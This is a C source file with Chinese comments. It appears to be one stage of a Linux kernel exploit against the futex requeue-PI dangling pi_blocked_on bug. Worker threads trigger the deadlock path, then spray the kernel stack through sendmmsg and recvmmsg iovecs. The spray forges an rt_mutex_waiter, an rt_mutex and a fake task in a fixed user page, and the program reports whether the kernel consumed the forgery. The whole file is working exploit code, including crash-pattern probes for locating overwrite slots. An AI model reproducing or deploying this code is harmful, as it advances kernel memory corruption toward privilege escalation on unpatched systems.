/* P2.4: 栈重塑验证（sendmmsg + recvmmsg 双喷）
 *
 * 目标：在 A 的悬空 pi_blocked_on (SP_entry-0x1B0) 处伪造 rt_mutex_waiter，
 *       让 T 阻塞在 A 持有的 u4 时，chain-walk 读到伪造 waiter。
 *
 * 覆盖布局：
 *   recvmmsg iovstack  @ D=0x1A0 -> waiter+16..79（含 lock@44）
 *   sendmmsg iovstack  @ D=0x1E0 -> waiter 0..15
 *   sendmmsg msghdr    @ D=0x1A0 -> waiter 16..43（用户可控 28 字节）
 *   顺序：recvmmsg 先，sendmmsg 后（后者覆盖 0..43，但 44..79 保留）
 *
 * 判定：
 *   成功 → T 的 LOCK_PI(u4) 正常阻塞（不返回）
 *   失败 → T 返回 EDEADLK（或内核 panic）
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <stdint.h>
#include <sched.h>
#include <pthread.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <time.h>
#include <fcntl.h>

#define FUTEX_LOCK_PI 6
#define FUTEX_UNLOCK_PI 7
#define FUTEX_WAIT_REQUEUE_PI 11
#define FUTEX_CMP_REQUEUE_PI 12
#define SYS_RECVMMSG 365
#define SYS_SENDMMSG 374

struct mmsghdr_local {
    struct msghdr msg_hdr;
    unsigned int msg_len;
};

static int futex(uint32_t *u, int op, uint32_t val, const struct timespec *to,
                 uint32_t *u2, uint32_t val3) {
    return syscall(SYS_futex, u, op, val, to, u2, val3);
}

static uint32_t u1 = 0, u2 = 0, u3 = 0, u4 = 0;
static volatile int a_ready = 0, b_locked_u2 = 0, a_sprayed = 0, t_ret = 999, t_errno = 0;
static volatile int a_rr, a_e1, a_rs, a_e2; static volatile unsigned a_lock;
static volatile int a_wret, a_werr;
static int sv[2] = {-1, -1};
int g_skip_spray = 0;
static uint8_t *page = NULL;
static uint32_t lock_addr;

/* ---------- 伪造结构（全部在 page 内） ---------- */
static int g_lockup_probe = 0;
static int g_saturate = 0;
static int g_pattern = 0;      /* 图案探针：每个 iovec 字填唯一值，崩溃 r8 即命中槽位 */
static void build_fake(void) {
    memset(page, 0, 0x2000);
    lock_addr = (uint32_t)(uintptr_t)(page + 0x100);
    uint32_t node = (uint32_t)(uintptr_t)(page + 0x200);

    /* 假 rt_mutex @ page+0x100 */
    *(uint32_t *)(page + 0x100) = g_lockup_probe ? 1 : 0;  /* wait_lock：探针模式=已锁 */
    *(uint32_t *)(page + 0x108) = node + 12;    /* wait_list.node_list.next */
    *(uint32_t *)(page + 0x10c) = node + 12;    /* wait_list.node_list.prev */
    *(uint32_t *)(page + 0x110) = 0;            /* owner（会被 list_del 覆盖为 page+0x308） */

    /* 假 plist_node（rt_mutex_waiter 形态）@ page+0x200 */
    *(uint32_t *)(page + 0x200) = 0;            /* prio = 0（高于 A 的 120） */
    *(uint32_t *)(page + 0x204) = node + 4;     /* prio_list.next 自指 */
    *(uint32_t *)(page + 0x208) = node + 4;     /* prio_list.prev 自指 */
    *(uint32_t *)(page + 0x20c) = node + 12;    /* node_list 自指 */
    *(uint32_t *)(page + 0x210) = node + 12;
    *(uint32_t *)(page + 0x22c) = lock_addr;    /* +0x2c = lock（BUG_ON 检查用） */

    /* 假 task（由 msg_name 写入 owner 后产生）usage 必须非 0，否则 put_task_struct 会释放它 */
    *(uint32_t *)(page + 0x310) = 0x1000;       /* fake_task + 8 = usage */
}

/* ---------- A：触发 + 双喷 ---------- */
static void *thread_a(void *arg) {
    int r = futex(&u3, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
    printf("[A] LOCK_PI(u3)=%d (tid=%d)\n", r, (int)syscall(SYS_gettid));
    r = futex(&u4, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
    printf("[A] LOCK_PI(u4)=%d\n", r);
    a_ready = 1;

    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    ts.tv_sec += 1; ts.tv_nsec += 500 * 1000 * 1000;
    while (ts.tv_nsec >= 1000000000) { ts.tv_sec++; ts.tv_nsec -= 1000000000; }
    r = futex(&u1, FUTEX_WAIT_REQUEUE_PI, 0, &ts, &u2, 0);
    a_wret = r; a_werr = errno;   /* 不在 A 里 printf：write 会踩栈 */

    extern int g_skip_spray;
    if (g_skip_spray) { a_sprayed = 1; for(;;) __sync_synchronize(); }
    /* ---- 喷雾开始：先 recvmmsg（16..79），后 sendmmsg（0..15 + 16..43） ---- */
    struct iovec iv[8];
    struct mmsghdr_local m;

    /* recvmmsg：iov[3].len 落在 waiter+44 = lock */
    memset(iv, 0, sizeof iv);
    if (g_pattern) {
        /* 唯一值：0xB0000001 + 4*i，奇数值必触发对齐异常 -> r8 落在 last_kmsg */
        for (int i = 0; i < 8; i++) {
            iv[i].iov_base = (void *)(uintptr_t)(0xB0000001u + 8u * i);
            iv[i].iov_len  = (size_t)(uintptr_t)(0xB0000005u + 8u * i);
        }
    } else if (g_saturate) {
        for (int i = 0; i < 8; i++) {
            iv[i].iov_base = (void *)(uintptr_t)lock_addr;
            iv[i].iov_len  = (size_t)(uintptr_t)lock_addr;
        }
    } else {
        for (int i = 0; i < 8; i++) {
            iv[i].iov_base = (void *)(uintptr_t)(page + 0x800 + i * 0x40);
            iv[i].iov_len = 0x40;
        }
        iv[3].iov_len = lock_addr;              /* waiter 44..47 */
    }
    memset(&m, 0, sizeof m);
    m.msg_hdr.msg_iov = iv; m.msg_hdr.msg_iovlen = 8;
    int rr = syscall(SYS_RECVMMSG, sv[0], &m, 1, 0x40 /*MSG_DONTWAIT*/, NULL);
    int e1 = errno;

    /* sendmmsg：iovstack 落 waiter 0..15；msghdr 落 waiter 16..43 */
    memset(iv, 0, sizeof iv);
    if (g_pattern) {
        for (int i = 0; i < 8; i++) {
            iv[i].iov_base = (void *)(uintptr_t)(0xC0000001u + 8u * i);
            iv[i].iov_len  = (size_t)(uintptr_t)(0xC0000005u + 8u * i);
        }
    } else if (g_saturate) {
        for (int i = 0; i < 8; i++) {
            iv[i].iov_base = (void *)(uintptr_t)lock_addr;
            iv[i].iov_len  = (size_t)(uintptr_t)lock_addr;
        }
    } else {
        iv[0].iov_base = (void *)(uintptr_t)0x78;
        iv[0].iov_len  = (size_t)(uintptr_t)(page + 0x300);
        iv[1].iov_base = (void *)(uintptr_t)(page + 0x304);
        iv[1].iov_len  = (size_t)(uintptr_t)(page + 0x108);
    }
    memset(&m, 0, sizeof m);
    m.msg_hdr.msg_name    = (void *)(uintptr_t)(g_saturate ? lock_addr : (page + 0x308));
    m.msg_hdr.msg_namelen = 0;
    m.msg_hdr.msg_iov     = iv;
    m.msg_hdr.msg_iovlen  = 8;
    m.msg_hdr.msg_control = NULL;
    m.msg_hdr.msg_controllen = 0;
    m.msg_hdr.msg_flags   = 0;
    int rs = syscall(SYS_SENDMMSG, sv[0], &m, 1, 0x40, NULL);
    int e2 = errno;

    /* 注意：喷雾后绝不能有 syscall（printf 的 write 会踩烂整个区域） */
    a_rr = rr; a_e1 = e1; a_rs = rs; a_e2 = e2; a_lock = lock_addr;
    __sync_synchronize();
    a_sprayed = 1;

    /* 不再发起任何 syscall，保持栈内容 */
    for (;;) __sync_synchronize();
    return NULL;
}

/* ---------- B：持有 u2，阻塞在 u3（低优先级） ---------- */
static void *thread_b(void *arg) {
    nice(19);
    int r = futex(&u2, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
    printf("[B] LOCK_PI(u2)=%d\n", r);
    b_locked_u2 = 1;
    r = futex(&u3, FUTEX_LOCK_PI, 0, NULL, NULL, 0);   /* 阻塞（A 持有） */
    printf("[B] LOCK_PI(u3)=%d (解锁说明被唤醒)\n", r);
    return NULL;
}

/* ---------- D：阻塞在 u2 上，保证 u2.wait_list 非空（失败安全网） ---------- */
static volatile int d_ready = 0;
static void *thread_d(void *arg) {
    nice(19);
    d_ready = 1;
    int r = futex(&u2, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
    printf("[D] LOCK_PI(u2)=%d\n", r);
    return NULL;
}

/* ---------- T：在 u4 上阻塞，消费悬空指针 ---------- */
static void *thread_t(void *arg) {
    while (!a_sprayed) __sync_synchronize();
    int r = futex(&u4, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
    t_errno = errno;
    t_ret = r;
    printf("[T] LOCK_PI(u4)=%d (errno=%d)\n", r, t_errno);
    return NULL;
}

int main(int argc, char **argv) {
    setvbuf(stdout, NULL, _IONBF, 0);
    int skip_t = (argc > 1 && argv[1][0] == 'n');
    int skip_spray = (argc > 1 && argv[1][0] == 's');
    g_lockup_probe = (argc > 1 && (argv[1][0] == 'l' || argv[1][0] == 'x'));
    g_saturate = (argc > 1 && argv[1][0] == 'x');
    g_pattern = (argc > 1 && argv[1][0] == 'p');
    printf("=== spray_consume start (pid=%d) skip_t=%d skip_spray=%d ===\n", getpid(), skip_t, skip_spray);

    page = mmap((void *)0x20000000, 0x2000, PROT_READ | PROT_WRITE,
                MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
    if (page == MAP_FAILED) {
        page = mmap(NULL, 0x2000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    }
    if (page == MAP_FAILED) { perror("mmap"); return 1; }
    printf("[M] page=%p\n", page);
    build_fake();

    if (socketpair(AF_UNIX, SOCK_STREAM, 0, sv) != 0) { perror("socketpair"); return 1; }
    fcntl(sv[0], 4 /*F_SETFL*/, 0x800 /*O_NONBLOCK*/);

    g_skip_spray = skip_spray;
    pthread_t ta, tb, tt;
    pthread_create(&ta, NULL, thread_a, NULL);
    while (!a_ready) __sync_synchronize();
    usleep(100000);                       /* A 进入 WAIT_REQUEUE_PI */

    pthread_create(&tb, NULL, thread_b, NULL);
    while (!b_locked_u2) usleep(200);
    usleep(200000);                       /* B 阻塞在 u3 */

    pthread_t td;
    pthread_create(&td, NULL, thread_d, NULL);
    while (!d_ready) __sync_synchronize();
    usleep(200000);                       /* D 阻塞在 u2 */

    printf("[C] 状态 u1=%#x u2=%#x u3=%#x u4=%#x\n", u1, u2, u3, u4);
    int r = futex(&u1, FUTEX_CMP_REQUEUE_PI, 1, NULL, &u2, 0);
    printf("[C] CMP_REQUEUE_PI=%d errno=%d %s\n", r, errno, errno == 35 ? "(EDEADLK 命中)" : "");

    if (!skip_t) pthread_create(&tt, NULL, thread_t, NULL);
    else printf("[M] skip_t：不触发消费\n");
    usleep(1200000);                      /* 等 T 的结果 */

    printf("[A] WAIT_REQUEUE_PI=%d(e=%d) recvmmsg=%d(e=%d) sendmmsg=%d(e=%d) lock=%#x\n",
           a_wret, a_werr, a_rr, a_e1, a_rs, a_e2, a_lock);
    if (skip_t) printf("\n*** VERDICT: 仅喷雾，未消费（存活 = 喷雾本身安全） ***\n");
    else if (t_ret == 999)
        printf("\n*** VERDICT: T 仍阻塞 -> 假 waiter 被消费，喷雾成功 ***\n");
    else
        printf("\n*** VERDICT: T 返回 %d (errno=%d) -> 喷雾失败/链走未到假锁 ***\n", t_ret, t_errno);
    return 0;
}
